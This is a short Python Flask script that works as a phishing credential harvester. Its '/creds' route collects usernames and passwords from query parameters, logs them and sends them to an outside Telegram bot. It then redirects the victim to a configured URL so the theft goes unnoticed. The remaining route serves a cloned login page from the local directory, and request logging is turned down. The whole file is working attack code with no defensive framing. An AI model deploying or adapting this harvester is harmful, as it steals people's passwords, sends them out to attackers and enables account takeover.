import logging 
import json
from flask import Flask, send_from_directory, request, render_template, redirect
from send_telegram import send_bot_message

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.CRITICAL)

# load config 
config = json.load(open("./config.json", "r"))

@app.route("/creds")
def harvest_creds():
    username = request.args.get('u', '')
    password = request.args.get('p', '')
    logging.critical("{}:{}".format(username, password))
    send_bot_message("{}:{}".format(username, password))
    return redirect(config.get("redirect_url", "") or "/")

@app.route("/<path:path>")
def hello_world(path):
    return send_from_directory("./", path)
    #return render_template('login.htm')

app.run()
